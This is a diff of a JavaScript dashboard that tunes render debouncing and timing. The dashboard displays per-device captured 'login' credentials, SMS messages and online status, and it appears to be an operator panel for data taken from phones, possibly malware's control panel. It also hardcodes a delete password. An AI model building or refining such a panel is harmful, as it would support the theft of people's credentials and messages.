@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - Complete Fixed - No Blink, Smooth Touch/Click      */
+/* app.js - Complete Fixed - NO AUTO REFRESH, NO BLINK         */
 /* ============================================================ */
 
 // ============================================================
@@ -46,13 +46,13 @@ let isUpdatingUI = false;
 let deviceOnlineStatus = {};
 let renderTimeout = null;
 let lastRenderTime = 0;
-const MIN_RENDER_INTERVAL = 500;
+const MIN_RENDER_INTERVAL = 800;
 let lastDataHash = '';
 let deletePassword = '9999';
 let isFirstLoad = true;
-let isInitialRender = true;
 let pendingUpdates = {};
-let isTouchDevice = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+let isDataChanging = false;
+let dataChangeTimeout = null;
 
 // ============================================================
 // DOM REFS
@@ -75,40 +75,65 @@ db.ref(".info/connected").on("value", (snap) => {
 });
 
 // ============================================================
-// MAIN DATA LISTENER - WITH DEBOUNCE FOR SMOOTH
+// MAIN DATA LISTENER - SMART DEBOUNCE
 // ============================================================
 db.ref().on("value", (snapshot) => {
     const newData = snapshot.val() || {};
     
+    // Check if data actually changed
     const newHash = JSON.stringify(newData);
     if (newHash === lastDataHash) {
         return;
     }
     
+    // Update cached data
     cachedData = newData;
     lastDataHash = newHash;
     
+    // Update internal caches
     updateDeviceOnlineStatus();
     buildDeviceCaches();
     
+    // Check if user is typing
     const active = document.activeElement;
     const typing = active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.tagName === 'SELECT');
     if (typing) {
         return;
     }
     
-    // Debounce render - prevent multiple rapid renders
-    if (renderTimeout) {
-        clearTimeout(renderTimeout);
+    // Mark that data is changing
+    isDataChanging = true;
+    
+    // Clear any existing timeout
+    if (dataChangeTimeout) {
+        clearTimeout(dataChangeTimeout);
     }
     
-    renderTimeout = setTimeout(() => {
-        if (!isRendering && !isUpdatingUI) {
-            performRender();
-            lastRenderTime = Date.now();
+    // Wait for data to settle before rendering
+    dataChangeTimeout = setTimeout(() => {
+        isDataChanging = false;
+        
+        // Only render if enough time has passed
+        const now = Date.now();
+        if (now - lastRenderTime > MIN_RENDER_INTERVAL) {
+            if (!isRendering && !isUpdatingUI) {
+                performRender();
+                lastRenderTime = now;
+            }
+        } else {
+            // If too soon, schedule a render
+            if (renderTimeout) clearTimeout(renderTimeout);
+            renderTimeout = setTimeout(() => {
+                if (!isRendering && !isUpdatingUI) {
+                    performRender();
+                    lastRenderTime = Date.now();
+                }
+                renderTimeout = null;
+            }, MIN_RENDER_INTERVAL);
         }
-        renderTimeout = null;
-    }, 300);
+        
+        dataChangeTimeout = null;
+    }, 500); // Wait 500ms for data to settle
     
     if (isFirstLoad) {
         isFirstLoad = false;
@@ -162,15 +187,16 @@ function updateDeviceOnlineStatus() {
 }
 
 // ============================================================
-// PERFORM RENDER - OPTIMIZED
+// PERFORM RENDER - ONLY WHEN NEEDED
 // ============================================================
 function performRender() {
-    if (isRendering || isUpdatingUI) return;
+    if (isRendering || isUpdatingUI || isDataChanging) return;
     isRendering = true;
     
     try {
         updateCounts();
         
+        // Only render visible panels
         if (isPanelOpen.devices) {
             renderDevicesOptimized();
         }
@@ -188,14 +214,13 @@ function performRender() {
                 loadBackupSmsForDevice(selected);
             }
         }
-        isInitialRender = false;
     } finally {
         isRendering = false;
     }
 }
 
 // ============================================================
-// UPDATE COUNTS
+// UPDATE COUNTS - FAST
 // ============================================================
 function updateCounts() {
     const devices = cachedData.user_data || {};
@@ -246,7 +271,7 @@ function deleteAllCredentials() {
     
     Promise.all(promises).then(() => {
         showToast('✅ All credentials deleted successfully!', 'success');
-        performRender();
+        setTimeout(() => performRender(), 300);
     }).catch(err => {
         showToast('❌ Error: ' + err.message, 'error');
     });
@@ -275,7 +300,7 @@ function deleteDeviceCredentials(devId) {
     
     db.ref(`login/${devId}`).remove().then(() => {
         showToast(`✅ Credentials deleted for ${devId}`, 'success');
-        performRender();
+        setTimeout(() => performRender(), 300);
     }).catch(err => {
         showToast('❌ Error: ' + err.message, 'error');
     });
@@ -314,7 +339,7 @@ function deleteAllSms() {
         });
         allSmsList = [];
         allSmsOffset = 0;
-        performRender();
+        setTimeout(() => performRender(), 300);
     }).catch(err => {
         showToast('❌ Error: ' + err.message, 'error');
     });
@@ -346,14 +371,14 @@ function deleteDeviceSms(devId) {
         deviceSmsCache[devId] = { offset: 0, all: [] };
         allSmsList = [];
         allSmsOffset = 0;
-        performRender();
+        setTimeout(() => performRender(), 300);
     }).catch(err => {
         showToast('❌ Error: ' + err.message, 'error');
     });
 }
 
 // ============================================================
-// RENDER DEVICES OPTIMIZED - NO BLINK ON CLICK
+// RENDER DEVICES OPTIMIZED - NO BLINK
 // ============================================================
 function renderDevicesOptimized() {
     if (isUpdatingUI) return;
@@ -775,8 +800,6 @@ function renderAllSmsOptimized() {
 // TOGGLE DEVICE - SMOOTH, NO BLINK
 // ============================================================
 function toggleDevice(devId) {
-    if (isUpdatingUI) return;
-    
     // Prevent multiple rapid clicks
     if (pendingUpdates[devId]) {
         return;
@@ -788,7 +811,6 @@ function toggleDevice(devId) {
         
         const card = document.getElementById(`card-${devId}`);
         if (card) {
-            // Toggle class - this is smooth and doesn't cause blink
             card.classList.toggle('expanded');
             
             const hint = card.querySelector('.device-top .device-name + div');
@@ -796,11 +818,9 @@ function toggleDevice(devId) {
                 hint.textContent = expandedDevices[devId] ? '▲ Click to collapse' : '▼ Click to expand';
             }
             
-            // Auto-check status when expanded
             if (expandedDevices[devId]) {
                 setTimeout(() => {
                     checkDeviceStatus(devId);
-                    // Auto scroll credentials if login tab is active
                     if (activeTabs[devId] === 'login') {
                         setTimeout(() => autoScrollCredentials(devId), 400);
                     }
@@ -810,7 +830,7 @@ function toggleDevice(devId) {
     } finally {
         setTimeout(() => {
             pendingUpdates[devId] = false;
-        }, 200);
+        }, 300);
     }
 }
 
@@ -818,8 +838,6 @@ function toggleDevice(devId) {
 // SET TAB - SMOOTH, NO BLINK
 // ============================================================
 function setTab(devId, tab) {
-    if (isUpdatingUI) return;
-    
     if (pendingUpdates[devId]) {
         return;
     }
@@ -865,7 +883,7 @@ function setTab(devId, tab) {
     } finally {
         setTimeout(() => {
             pendingUpdates[devId] = false;
-        }, 200);
+        }, 300);
     }
 }
 
@@ -889,7 +907,7 @@ function clearSearch() {
 }
 
 // ============================================================
-// CHECK DEVICE STATUS - LIVE
+// CHECK DEVICE STATUS
 // ============================================================
 function checkDeviceStatus(devId) {
     if (!devId) return;
